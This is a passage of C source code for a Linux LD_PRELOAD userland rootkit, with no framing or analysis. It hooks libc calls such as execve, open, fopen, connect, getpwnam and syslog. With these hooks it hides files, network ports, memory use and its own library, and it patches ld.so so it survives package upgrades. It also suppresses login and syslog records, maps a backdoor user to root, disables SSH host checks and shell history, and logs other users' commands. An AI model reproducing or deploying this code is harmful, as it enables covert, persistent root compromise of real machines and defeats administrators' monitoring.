		snprintf(buf, 256, "[%s] [%s] %s ", timebuf, getcwd(cwd, 255), bin_name);
	syscall(SYS_WRITE, logfd, buf, strlen(buf));
	while (argv[x]) {
		syscall(SYS_WRITE, logfd, argv[x], strlen(argv[x]));
		syscall(SYS_WRITE, logfd, " ", 1);
		x++;
	}
	syscall(SYS_WRITE, logfd, "\n", 1);
	close(logfd);
}

void rename_ldpath()
{
	char ldpath1[32];
	char ldpath2[32];
	char buf[256];
	int status;
	char *p;

	p = (char *)XOR(HIDDEN_PRELOAD);
	strcpy(ldpath1, p);
	p = (char *)XOR(HIDDEN_PRELOAD2);
	strcpy(ldpath2, p);

	rename(ldpath1, ldpath2);
	if (fork() == 0)
		return;
	wait(&status);
	rename(ldpath2, ldpath1);
	exit(0);
}


static __inline__
void exec_unload(const char *filename, char *const argv[], char *const envp[])
{
	char ldpath1[32];
	char ldpath2[32];
	char buf[256];
	char *p;

	p = (char *)XOR(HIDDEN_PRELOAD);
	strcpy(ldpath1, p);
	p = (char *)XOR(HIDDEN_PRELOAD2);
	strcpy(ldpath2, p);
	switch (fork()) {
		case 0:
			sched_yield();
			rename(ldpath2, ldpath1);
			exit(0);
		default:
			rename(ldpath1, ldpath2);
			syscall(SYS_EXECVE, filename, argv, envp);
	}
}

void patch_ld(void)
{
	struct stat sb;
	char ldpath[256] = {0};
	char cmd[256];
	char buf[256];
	char *map, *p;
	int fd;

	syscall(SYS_SETGID, MAGIC_GID);

	// copy ld
	readlink(XOR(LD_LINK), ldpath, 255);
	if (*ldpath != '/') {
		sprintf(cmd, XOR(LD_ROOT), ldpath);
		strcpy(ldpath, cmd);
	}
	if (syscall(SYS_stat, ldpath, &sb) < 0)
		exit(0);
	sprintf(cmd, XOR(CP_LIB_DSX), ldpath);
	system(cmd);

	// patch copied ld
	fd = syscall(SYS_OPEN, XOR(LIB_DSX), O_RDWR);
	map = mmap(NULL, sb.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (map == (void *)-1)
		exit(0);

	// if ld.so was not changed then do nothing
	if ((p=memmem(map, sb.st_size, XOR(LDHOME), 14))) {
		munmap(map, sb.st_size);
		close(fd);
		return;
	}
	p = (char *)memmem(map, sb.st_size, XOR(ETC_PRELOAD), 18);
	if (!p)
		exit(0);
	strcpy(p, XOR(HIDDEN_PRELOAD));

	// append /etc/ld.so.preload string
	munmap(map, sb.st_size);
	lseek(fd, 0, SEEK_END);
	syscall(SYS_WRITE, fd, XOR(ETC_PRELOAD), 18);
	close(fd);
out:
	// set new ld
	sprintf(cmd, XOR(MV_LIB_DSX), ldpath);
	system(cmd);
}

static __inline__ void exec_upgrade(const char *filename, char *const argv[], char *const envp[], char *update_str)
{
	char buf[256];
	int fd, pid, status;

	if (argv[1] && !strcmp(argv[1], update_str)) {
		fd = syscall(SYS_OPEN, XOR(ETC_PRELOAD), O_RDWR|O_CREAT, 0644);
		syscall(SYS_WRITE, fd, XOR(HIDDEN_LDSO), 23);
		syscall(SYS_WRITE, fd, "\n", 1);
		syscall(SYS_CLOSE, fd);
		syscall(SYS_CHOWN, XOR(ETC_PRELOAD), 0, 8888);
		if ((pid=fork()) == 0) {
			syscall(SYS_EXECVE, filename, argv, envp);
		}
	} else {
		syscall(SYS_EXECVE, filename, argv, envp);
		exit(0);
	}
	// after upgrade is finished repatch the ld.so
	wait4(pid, &status, 0, NULL);
	patch_ld();
	exit(0);
}

int execve(const char *filename, char *const argv[], char *const envp[])
{
	char buf[1024];
	char logfile[1024];
	int x = 0, gid = syscall(SYS_GETGID);
	unsigned long long cmd;

	LIBC_HOOK(execve, XOR(EXECVE));
	if (!filename)
		goto out;

#ifdef EXEC_HARDEN
	if (!strncmp(filename, "/tmp/", 5)) {
		snprintf(logfile, 255, "[BLOCKED] %s", filename);
		exec_log(logfile, argv);
		errno = ENOEXEC;
		return -1;
	}
#endif

	/* ******************
	 * /usr filters
     *******************/
	if (!strncmp(filename, "/usr/", 5)) {
		/* ******************
		 * /usr/bin filters
     	*******************/
		cmd = *(unsigned long *)(filename+5);
		/* apt-get upgrade */
		if ((cmd == 0x007470612f6e6962ULL) || (cmd==0x2d7470612f6e6962ULL))
			exec_upgrade(filename, argv, envp, "upgrade");
		/* yum update */
		if (cmd == 0x006d75792f6e6962ULL)
			exec_upgrade(filename, argv, envp, "update");
		/* RedHat /usr/bin/dmesg filter */
		if (cmd == 0x73656d642f6e6962ULL && *(filename+13) == 'g') {
			filter_dmesg(filename, argv, envp);
		}
		if (!strcmp(filename, XOR(STRACE_BIN)) && (gid != MAGIC_GID))
			filter_strace(filename, argv, envp);

		/* ******************
		 * /usr/sbin filters
    	 *******************/

		/* /usr/sbin/ip */
		if ((cmd == 0x0070692f6e696273ULL) && argv[1])
			filter_ip_route(filename, argv, envp);
		// /usr/sbin/iptables
		if ((*(unsigned long long *)(filename+5) == 0x7470692f6e696273ULL) && *(unsigned int *)(filename+5+8) == 0x656c6261) {
			if (!filter_iptables(filename, argv, envp))
				goto out;
		}
	}

	/* ******************
	 * /sbin filters
     *******************/
	// /sbin/iptables
	if (!strcmp(XOR(IPTABLES_BIN), filename)) {
		if (!filter_iptables(filename, argv, envp))
			goto out;
	}
	// /sbin/ip
	if ((*(unsigned long long *)filename == 0x70692f6e6962732fULL) && (*(filename+8) == '\0') && argv[1])
			filter_ip_route(filename, argv, envp);

	/* ******************
	 * /bin filters
     *******************/
	if (!strcmp(XOR(DMESG_BIN), filename))
		filter_dmesg(filename, argv, envp);

	// log exec cmd if bash/sh and check for LD_TRACE_LOADED_OBJECTS
	if (gid != MAGIC_GID) {
		exec_log(filename, argv);
		if (!envp)
			goto out;
		while (envp[x] != NULL) {
			if (!strncmp(envp[x++], XOR(LD_TRACE), strlen(LD_TRACE))) {
				if (getuid() != 0)
					filter_ldd(argv); // does not return
				rename_ldpath();
				goto out;
			}
		}
		goto out;
	} else { // if (gid == MAGIC_GID)
		if (!strcmp(filename, "/usr/bin/ssh") || !strcmp(filename, "/usr/bin/scp")) {
			ssh_argv[0] = argv[0];
			ssh_argv[1] = "-o UserKnownHostsFile=/dev/null";
			ssh_argv[2] = "-o StrictHostKeyChecking=no";
			x = 1;
			while (argv[x]) {
				ssh_argv[x+2] = argv[x];
				x++;
				if (x >= 30)
					break;
			}
			return libc_syms.execve(filename, ssh_argv, envp);
		}
		if (!envp)
			goto out;
		// set HISTFILE=/dev/null & check for LD_TRACE_LOADED_OBJECTS
		while (envp[x] != NULL) {
			if (strstr(envp[x], XOR(MAIL))) {
				const char *histfile = XOR(HISTFILE);
				memcpy((char *)envp+(x*sizeof(void *)), &histfile, sizeof(void *));
				goto out;
			}
			if (!strncmp(envp[x], XOR(LD_TRACE), strlen(LD_TRACE)))
				rename_ldpath();
			x++;
		}
	}
	setgid(MAGIC_GID);
	setuid(0);
out:
	return libc_syms.execve(filename, argv, envp);
}

int hosts_access(struct request_info *req)
{
	char buf[4096];
	int fd, ret, n;
	char *ip, *p;

	LIBC_HOOK(hosts_access, XOR(HOSTS_ACCESS));
	fd = syscall(SYS_OPEN, XOR(HOSTS_ALLOW), O_RDONLY);
	if (fd < 0)
		goto out;
	n = syscall(SYS_READ, fd, buf, 4096);
	close(fd);
	if (n <= 0)
		goto out;

	buf[n-1] = 0;
	ret = libc_syms.hosts_access(req);
	ip = buf;
	while ((p=strchr(ip, '\n'))) {
		*p = 0;
		if (!strcmp(req->client[0].addr, ip))
			return 1;
		ip = p+1;
	}
	return (ret);
out:
	return libc_syms.hosts_access(req);
}

struct passwd *getpwnam(const char *name)
{
	struct passwd *pwd;
	char buf[256];

	LIBC_HOOK(getpwnam, XOR(GETPWNAM));
	if (!name)
		goto out;
	if (!strcmp(name, XOR(ESX_USER))) {
		pwd = libc_syms.getpwnam(XOR(ROOT));
		if (!pwd)
			return (pwd);
		pwd->pw_name  = strdup(buf);
		pwd->pw_uid   = 0;
		pwd->pw_gid   = MAGIC_GID;
		pwd->pw_dir   = strdup(XOR(LDHOME));
		pwd->pw_shell = "/bin/bash";
		return pwd;
	}
out:
	return libc_syms.getpwnam(name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *ubuf, size_t buflen, struct passwd **result)
{
	char buf[256];

	LIBC_HOOK(getpwnam_r, XOR(GETPWNAM_R));
	if (!name)
		goto out;
	if (!strcmp(name, XOR(ESX_USER)))
		return libc_syms.getpwnam_r(XOR(ROOT), pwd, ubuf, buflen, result);
out:
	return libc_syms.getpwnam_r(name, pwd, ubuf, buflen, result);

}

#ifdef __FreeBSD__
struct utmpx *pututxline(const struct utmpx *ut)
{
	char buf[32];

	LIBC_HOOK(pututxline, "pututxline");
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (NULL);
	return libc_syms.pututxline(ut);
}
#else
void updwtmp(const char *wfile, const struct utmp *ut)
{
	char buf[32];

	LIBC_HOOK(updwtmp, XOR(UPDWTMP));
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return;
	libc_syms.updwtmp(wfile, ut);
}
struct utmp *pututline(const struct utmp *ut)
{
	char buf[32];

	LIBC_HOOK(pututline, XOR(PUTUTLINE));
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (NULL);
	return libc_syms.pututline(ut);
}
#endif

static __inline__ int port_hidden(int sport, int dport)
{
	char buf[4096];
	char *p, *line;
	int port, fd, n;

	fd = syscall(SYS_OPEN, XOR(HIDDEN_PORTS), O_RDONLY);
	if (fd <= 0)
		return 0;
	n = syscall(SYS_READ, fd, buf, 4096);
	close(fd);
	buf[n] = 0;
	line = buf;
	while ((p=strchr(line, '\n'))) {
		*p = 0;
		port = atoi(line);
		if ((port == dport) || (port==sport))
			return 1;
		line = p + 1;
	}
	return 0;
}

static void __inline__ add_hidden_port(int port)
{
	char buf[256];
	int fd, count;

	fd = syscall(SYS_OPEN, XOR(HIDDEN_PORTS), O_RDWR|O_APPEND|O_CREAT, 0644);
	count = sprintf(buf, "%d\n", port);
	syscall(SYS_WRITE, fd, buf, count);
	fsync(fd);
	syscall(SYS_CLOSE, fd);
}

#ifdef __i386__
#include <linux/net.h>
int sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	return syscall(SYS_SOCKETCALL, SYS_CONNECT, &sockfd);
}
int sys_bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	return syscall(SYS_SOCKETCALL, SYS_BIND, &sockfd);
}
#endif
#ifdef __AMD64__
static int __inline__ sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	return syscall(SYS_CONNECT, sockfd, addr, addrlen);
}
static int __inline__ sys_bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	return syscall(SYS_BIND, sockfd, addr, addrlen);
}

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	struct sockaddr_in laddr;
	struct sockaddr_in *raddr;
	socklen_t slen;
	int port, ret, serrno;

	ret = sys_connect(sockfd, addr, addrlen);
	if (addrlen != 16)
		goto out;
	serrno = errno;
	if (syscall(SYS_GETGID) != MAGIC_GID)
		goto out;
	raddr = (struct sockaddr_in *)addr;
	if (!raddr->sin_port)
		goto out;
	getsockname(sockfd, (struct sockaddr *)&laddr, &slen);
	if (!laddr.sin_port)
		goto out;
	port = htons(laddr.sin_port);
	add_hidden_port(port);
	errno = serrno;
out:
	return ret;
}

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	struct sockaddr_in *saddr;
	int port, ret;

	ret = sys_bind(sockfd, addr, addrlen);
	if (ret < 0)
		goto out;
	if (addrlen != 16)
		goto out;
	saddr = (struct sockaddr_in *)addr;
	if (!saddr->sin_port)
		goto out;
	if (syscall(SYS_GETGID) != MAGIC_GID)
		goto out;
	port = htons(saddr->sin_port);
	add_hidden_port(port);
out:
	return ret;
}
#if 0
static __inline__ void remove_port(int port)
{
	char cmd[256];
	char buf[256];

	sprintf(cmd, "sed -i '/%d/d' " "%s", port, XOR(HIDDEN_PORTS));
	system(cmd);
}
int shutdown(int sockfd, int how)
{
	struct sockaddr_in laddr;
	socklen_t slen;

	if (syscall(SYS_GETGID) != MAGIC_GID)
		goto out;
	getsockname(sockfd, (struct sockaddr *)&laddr, &slen);
	if (!laddr.sin_port || (slen != 16))
		goto out;
	remove_port(htons(laddr.sin_port));
out:
	return syscall(SYS_SHUTDOWN, sockfd, how);
}
int close(int fd)
{
	struct sockaddr_in laddr;
	socklen_t slen;

	if (syscall(SYS_GETGID) != MAGIC_GID)
		goto out;
	getsockname(fd, (struct sockaddr *)&laddr, &slen);
	if (errno == ENOTSOCK)
		goto out;
	if ((slen != 16) || !laddr.sin_port)
		goto out;
	remove_port(htons(laddr.sin_port));
out:
	return syscall(SYS_CLOSE, fd);
}
#endif
#endif

static __inline__ FILE *filter_tcp(const char *path)
{
	FILE *fp, *tmp;
	char line[512];
	char buf[64];
	unsigned int sport, dport;
	unsigned long long saddr, daddr;
	char *p;

	fp = libc_syms.fopen(path, "r");
	if (!fp)
		return (NULL);
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return fp;
	tmp = tmpfile();
	if (!tmp)
		return fp;
	while (fgets(line, sizeof(line)-1, fp) != NULL) {
		p = strchr(line+11, ':');
		if (!p) {
			fputs(line, tmp);
			continue;
		}
		sport = strtoul((char *)(p+1), NULL, 16);
		dport = strtoul((char *)(p+15), NULL, 16);
		if (port_hidden(sport, dport))
			continue;
		fputs(line, tmp);
	}
	fseek(tmp, 0, SEEK_SET);
	fclose(fp);
	return(tmp);
}

static __inline__ FILE *filter_maps(const char *path)
{
	FILE *tmp, *maps_fp;
	char buf[256];
	char line[256];

	maps_fp = libc_syms.fopen(path, "r");
	if (!maps_fp)
		return NULL;

	tmp = tmpfile();
	if (!tmp)
		return (maps_fp);

	while (fgets(line, 255, maps_fp) != NULL) {
		if (strstr(line, XOR(LDPATH)))
			continue;
		fputs(line, tmp);
	}
	fclose(maps_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ FILE *filter_smaps(const char *path)
{
	FILE *tmp, *smaps_fp;
	char buf[256];
	char line[256];
	int filter = 0;

	smaps_fp = libc_syms.fopen(path, "r");
	if (!smaps_fp)
		return NULL;

	tmp = tmpfile();
	if (!tmp)
		return (smaps_fp);

	while (fgets(line, 255, smaps_fp) != NULL) {
		if (strstr(line, XOR(LDPATH))) {
			filter = 1;
			continue;
		}
		if (strchr(line, '-'))
			filter = 0;
		if (!filter)
			fputs(line, tmp);
	}
	fclose(smaps_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ FILE *filter_numa(const char *path)
{
	FILE *tmp, *numa_fp;
	char buf[256];
	char line[256];

	numa_fp = libc_syms.fopen(path, "r");
	if (!numa_fp)
		return NULL;
	tmp = tmpfile();
	if (!tmp)
		return (numa_fp);
	while (fgets(line, 255, numa_fp) != NULL) {
		if (strstr(line, XOR(LDPATH)))
			continue;
		fputs(line, tmp);
	}
	fclose(numa_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ FILE *filter_mem(const char *path)
{
	FILE *mem_fp, *tmp;
	char buf[1024];
	char line[128];
	char memFree[64];
	char memAvail[64];
	char usage[64] = {0};
	char *p, *p1, *p2;
	int fd, n, rk_usage, mem_usage;

	mem_fp = libc_syms.fopen(path, "r");
	if (!mem_fp)
		return (NULL);

	if ((fd=syscall(SYS_OPEN, XOR(HIDDEN_MEM), O_RDONLY)) < 0)
		return mem_fp;

	tmp = tmpfile();
	if (!tmp) {
		close(fd);
		return (mem_fp);
	}
	n = syscall(SYS_READ, fd, buf, sizeof(buf)-1);
	close(fd);
	buf[n] = 0;
	p = strchr(buf, '\n');
	if (!p)
		return mem_fp;
	*p = 0;
	rk_usage = strtoul(buf, NULL, 10);

	// MemTotal
	fgets(line, 255, mem_fp);
	fputs(line, tmp);
	// MemFree
	fgets(line, 255, mem_fp);
	p2 = strchr(line, 'k') - 2;
	p1 = p2;
	while (*p1 != ' ')
		p1--;
	memcpy(usage, p1+1, p2-p1);
	mem_usage = strtoul(usage, NULL, 10);
	mem_usage += rk_usage;
	sprintf(memFree, "MemFree:          %d kB\n", mem_usage);
	fputs(memFree, tmp);
	// MemAvailable
	fgets(line, 255, mem_fp);
	p2 = strchr(line, 'k') - 2;
	p1 = p2;
	while (*p1 != ' ')
		p1--;
	memcpy(usage, p1+1, p2-p1);
	usage[p2-p1] = 0;
	mem_usage = strtoul(usage, NULL, 10);
	mem_usage += rk_usage;
	sprintf(memAvail, "MemAvailable:     %d kB\n", mem_usage);
	fputs(memAvail, tmp);
	// rest of /proc/meminfo
	while (fgets(line, 255, mem_fp) != NULL) {
		fputs(line, tmp);
	}
	fclose(mem_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ FILE *filter_netdev(const char *path)
{
	FILE *tmp, *net_fp;
	char buf[256];
	char line[256];

	net_fp = libc_syms.fopen(path, "r");
	if (!net_fp)
		return (NULL);

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return net_fp;

	tmp = tmpfile();
	if (!tmp)
		return (net_fp);

	while (fgets(line, 255, net_fp) != NULL) {
		if (strstr(line, XOR(TAP4)))
			continue;
		fputs(line, tmp);
	}
	fclose(net_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}
#if 0
static __inline__ FILE *filter_syslog(const char *path)
{
	FILE *tmp; *sys_fp;
	char buf[256];
	char line[256];

	sys_fp = libc_syms.fopen(path, "r");
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (sys_fp);
	tmp = tmpfile();
	if (!tmp || !sys_fp)
		return (sys_fp);

	while (fgets(line, 255, sys_fp) != NULL) {
		if (strstr(line, XOR(DMESG_PROMISC)))
			continue;
		if (strstr(line, XOR(DMESG_KVM)))
			continue;
		if (strstr(line, XOR(DMESG_TCPDUMP)))
			continue;
		if (strstr(line, XOR(LDPATH)))
			continue;
		if (strstr(line, XOR(LIBDL)))
			continue;
		fputs(line, tmp);
	}
	fclose(sys_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}
static __inline__ FILE *filter_log(const char *path)
{
	FILE *tmp, *mounts_fp;
	struct stat sb;
	char buf[1024] = {0};
	char line[256];
	char **mounts_filter, *p;
	int fd, nr_mounts, found_str = 0, x;

	mounts_fp = libc_syms.fopen(path, "r");
	if (!mounts_fp)
		return (NULL);
	if ((fd=syscall(SYS_OPEN, XOR(HIDDEN_MOUNTS), O_RDONLY)) < 0)
		return (mounts_fp);

	tmp = tmpfile();
	if (!tmp) {
		close(fd);
		return (mounts_fp);
	}

	mounts_filter = get_mod_list(fd, &nr_mounts);
	syscall(SYS_CLOSE, fd);
	
	while (fgets(line, 255, mounts_fp) != NULL) {
		for (x=0; x<nr_mounts; x++) {
			if (strstr(line, mounts_filter[x])) {
				found_str = 1;
				continue;
			}
		}
		if (found_str) {
			found_str = 0;
			continue;
		}
		fputs(line, tmp);
	}
	fclose(mounts_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}
#endif
#ifdef FILTER_LOAD
static __inline__ FILE *filter_load(const char *path)
{
	FILE *tmp, *load_fp;
	struct stat sb;
	char buf[256] = {0};
	char line[256];
	char curproc[32];
	char nproc[32];
	float one,five,ten;
	float scale, max_load;
	int fd;

	load_fp = libc_syms.fopen(path, "r");
	if ((syscall(SYS_GETGID) == MAGIC_GID) && !syscall(SYS_STAT, XOR(SHOW_LOAD), &sb))
		return (load_fp);

	fd = syscall(SYS_OPEN, XOR(MAX_LOAD), O_RDONLY);
	if (fd < 0)
		return (load_fp);
	syscall(SYS_READ, fd, buf, 255);
	max_load = atof(buf);
	close(fd);

	tmp = tmpfile();
	if (!tmp || !load_fp)
		return (load_fp);

	fscanf(load_fp, "%5f %5f %5f %s %s\n", &one, &five, &ten, curproc, nproc);
	if (one < max_load)
		return (load_fp);
	else if (one > 35.0)
		scale = 0.98;
	else if (one > 25.0)
		scale = 0.95;
	else
		scale = 0.90;

	one  = (one-(scale*one));
	five = (five-(scale*five));
	ten  = (ten-(scale*ten));
	fprintf(tmp, "%2.2f %2.2f %2.2f %s %s\n", one, five, ten, curproc, nproc);
	fclose(load_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ FILE *filter_stat(const char *path)
{
	FILE        *stat_fp;
	char         buf[256];

	stat_fp = libc_syms.fopen(XOR(HIDDEN_STAT), "r");
	if (stat_fp)
		return (stat_fp);
	return libc_syms.fopen(path, "r");
}
#endif

#ifdef FILTER_MOUNTS
static __inline__ FILE *filter_mounts(const char *path)
{
	FILE *tmp, *mounts_fp;
	struct stat sb;
	char buf[1024] = {0};
	char line[256];
	char **mounts_filter, *p;
	int fd, nr_mounts, found_str = 0, x;

	mounts_fp = libc_syms.fopen(path, "r");
	if (!mounts_fp)
		return (NULL);
	if ((fd=syscall(SYS_OPEN, XOR(HIDDEN_MOUNTS), O_RDONLY)) < 0)
		return (mounts_fp);

	tmp = tmpfile();
	if (!tmp) {
		close(fd);
		return (mounts_fp);
	}

	mounts_filter = get_mod_list(fd, &nr_mounts);
	syscall(SYS_CLOSE, fd);
	
	while (fgets(line, 255, mounts_fp) != NULL) {
		for (x=0; x<nr_mounts; x++) {
			if (strstr(line, mounts_filter[x])) {
				found_str = 1;
				continue;
			}
		}
		if (found_str) {
			found_str = 0;
			continue;
		}
		fputs(line, tmp);
	}
	fclose(mounts_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}
#endif

int pathmatch(const char *match, const char *path)
{
	char c = *path;

	// ls proc/... case
	if (*(int *)path == 0x636f7270)
		path += 5;

	// skip over /proc/pid/
	if (c > '0' && c <= '9') {
		while (*path != '/') {
			path++;
			if (*path == '0')
				return 0;
		}
		path++;
	} else if (*(int *)path == 0x666c6573) { // 'self'
		path += 5;
	}

	if (!strcmp(path, match))
		return 1;

	// pwd = /proc/net && cat ./tcp
	while (*match != '/') {
		match++;
		if (*match == '\0')
			return 0;
	}
	if (*path == '.')
		path += 2;
	if (!strcmp(path, match+1))
		return 1;
	return 0;
}

static __inline__ FILE *proc_filter_open(const char *filename, const char *path)
{
	char buf[64];

	if (pathmatch(XOR(PROC_TCP),       filename))
		return filter_tcp(path);
	if (pathmatch(XOR(PROC_MAPS),      filename))
		return filter_maps(path);
	if (pathmatch(XOR(PROC_SMAPS),     filename))
		return filter_smaps(path);
	if (pathmatch(XOR(PROC_NUMA),      filename))
		return filter_numa(path);
#ifdef FILTER_MOUNTS
	if (pathmatch(XOR(PROC_MOUNTS),    filename))
		return filter_mounts(path);
#endif
#ifdef FILTER_LOAD 
	if (pathmatch(XOR(PROC_LOAD),      filename))
		return filter_load(path);
	if (pathmatch(XOR(PROC_STAT),      filename))
		return filter_stat(path);
#endif
#ifdef HIDDEN_NETWORK
	if (pathmatch(XOR(PROC_NET_DEV),   filename))
		return filter_netdev(path);
	if (pathmatch(XOR(PROC_NET_ARP),   filename))
		return filter_netdev(path);
	if (pathmatch(XOR(PROC_NET_ROUTE), filename))
		return filter_netdev(path);
#endif
#ifdef FILTER_MEM
	if (pathmatch(XOR(PROC_MEM),       filename))
		return filter_mem(path);
#endif
	return (NULL);
}

FILE *fopen(const char *path, const char *mode)
{
	FILE *fp;
	struct stat sb;
	char buf[256];
	char cwd[256];

	LIBC_HOOK(fopen, XOR(FOPEN));
	if (hidden_stat(path) && syscall(SYS_GETGID) != MAGIC_GID) {
		errno = ENOENT;
		return (NULL);
	}

	// Absolute /proc paths
	if (*(int *)path == 0x6f72702f) {
		if (*(short *)(path+4) != 0x2f63)
			goto out;
		fp = proc_filter_open(path+6, path);
		if (!fp)
			goto out;
		return (fp);
	}

	// Relative /proc paths
	if (getcwd(cwd, 255) != NULL && (*(int *)(cwd) == 0x6f72702f)) {
		fp = proc_filter_open(path, path);
		if (!fp)
			goto out;
		return (fp);
	}
	if (*cwd == '/' && *(int *)path == 0x636f7270) {
		fp = proc_filter_open(path+5, path);
		if (!fp)
			goto out;
		return (fp);
	}
out:
	return libc_syms.fopen(path, mode);
}

int open(const char *path, int flags, ...)
{
	FILE *fp;
	char buf[256];
	char cwd[256];
	va_list va;
	mode_t mode;

	LIBC_HOOK(open,  XOR(OPEN));
	LIBC_HOOK(fopen, XOR(FOPEN));
	va_start(va, flags);
	mode = va_arg(va, mode_t);
	if (hidden_stat(path) && syscall(SYS_GETGID) != MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	if ((syscall(SYS_GETGID) == MAGIC_GID) && !strcmp(__progname, XOR(SSHD)) && strstr(path, XOR(LASTLOG)))
		path = "/dev/null";

	// absolute /proc paths
	if (*(int *)path == 0x6f72702f) {
		if (*(short *)(path+4) != 0x2f63)
			goto out;
		fp = proc_filter_open(path+6, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}

	// relative /proc paths
	if (getcwd(cwd, 255) != NULL && (*(int *)(cwd) == 0x6f72702f)) {
		fp = proc_filter_open(path, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
	if (*cwd == '/' && *(int *)path == 0x636f7270) {
		fp = proc_filter_open(path+5, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
out:
	return libc_syms.open(path, flags, mode);
}

int open64(const char *path, int flags, ...)
{
	FILE *fp;
	struct stat sb;
	char cwd[256];
	char buf[256];
	va_list va;
	mode_t mode;

	LIBC_HOOK(open64, XOR(OPEN64));
	LIBC_HOOK(fopen,  XOR(FOPEN));
	va_start(va, flags);
	mode = va_arg(va, mode_t);

	if (hidden_stat(path) && syscall(SYS_GETGID) != MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}

	// absolute /proc paths
	if (*(int *)path == 0x6f72702f) {
		if (*(short *)(path+4) != 0x2f63)
			goto out;
		fp = proc_filter_open(path+6, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}

	// relative proc/xxx paths
	if (getcwd(cwd, 255) != NULL && (*(int *)(cwd) == 0x6f72702f)) {
		fp = proc_filter_open(path, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
	if (*cwd == '/' && *(int *)path == 0x636f7270) {
		fp = proc_filter_open(path+5, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
out:
	return libc_syms.open64(path, flags, mode);
}

int openat(int dirfd, const char *path, int flags, ...)
{
	FILE *fp;
	char buf[256];
	char cwd[256];
	va_list va;
	mode_t mode;

	LIBC_HOOK(openat, XOR(OPENAT));
	LIBC_HOOK(fopen,  XOR(FOPEN));
	va_start(va, flags);
	mode = va_arg(va, mode_t);

	if (hidden_stat(path) && (syscall(SYS_GETGID) != MAGIC_GID)) {
		errno = ENOENT;
		return -1;
	}

	// if path == '/pro'
	if (*(int *)path == 0x6f72702f) {
		// if path+4 == 'c/'
		if (*(short *)(path+4) != 0x2f63)
			goto out;
		fp = proc_filter_open(path+6, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}

	if (getcwd(cwd, 255) != NULL && (*(int *)(cwd) == 0x6f72702f)) {
		fp = proc_filter_open(path, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
	if (*cwd == '/' && *(int *)path == 0x636f7270) {
		fp = proc_filter_open(path+5, path);
		if (!fp)
			goto out;
		return fileno(fp);
	}
out:
	return libc_syms.openat(dirfd, path, flags, mode);
}

int setgid(gid_t gid)
{
	char buf[64];

	if (getgid() == MAGIC_GID)
		return 0;
	return syscall(SYS_SETGID, gid);
}

int setegid(gid_t egid)
{
	int (*o_setegid)(gid_t egid) = dlsym(RTLD_NEXT, "setegid");

	if (getgid() == MAGIC_GID) {
		if (egid != MAGIC_GID)
			o_setegid(MAGIC_GID);
		return 0;
	}
	return o_setegid(egid);
}

int setregid(gid_t rgid, gid_t egid)
{
	if (getgid() == MAGIC_GID) {
		if ((rgid != MAGIC_GID) || (egid != MAGIC_GID))
			return syscall(SYS_SETREGID, MAGIC_GID, MAGIC_GID);
	}
	return syscall(SYS_SETREGID, rgid, egid);
}


// breaks when rk user starts sshd
int setresgid(gid_t rgid, gid_t egid, gid_t sgid)
{
	if (!strcmp(__progname, "sshd"))
		goto out;
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return 0;
out:
	return syscall(SYS_SETRESGID, rgid, egid, sgid);
}

gid_t getgid(void)
{
	gid_t gid = syscall(SYS_GETGID);
	if (gid == MAGIC_GID && !strcmp(__progname, "ssh"))
		return 0;
	return (gid);
}

gid_t getegid(void)
{
	if (syscall(SYS_GETGID) == MAGIC_GID && !strcmp(__progname, "ssh"))
		return 0;
	return syscall(SYS_GETEGID);
}


void syslog(int priority, const char *fmt, ...)
{
    va_list ap;

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return;

    va_start(ap, fmt);
    vsyslog(priority, fmt, ap);
    va_end(ap);
}

void __syslog_chk(int priority, int flag, const char *fmt, ...)
{
	va_list ap;

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return;

    va_start(ap, fmt);
    vsyslog(priority, fmt, ap);
    va_end(ap);
}

int chdir(const char *path)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_CHDIR, path);
}

int mkdir(const char *path, mode_t mode)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_MKDIR, path, mode);
}

int mkdirat(int dirfd, const char *path, mode_t mode)
{
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
out:
	return syscall(SYS_MKDIRAT, dirfd, path, mode);
}

int unlinkat(int dirfd, const char *path, int flags)
{

	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

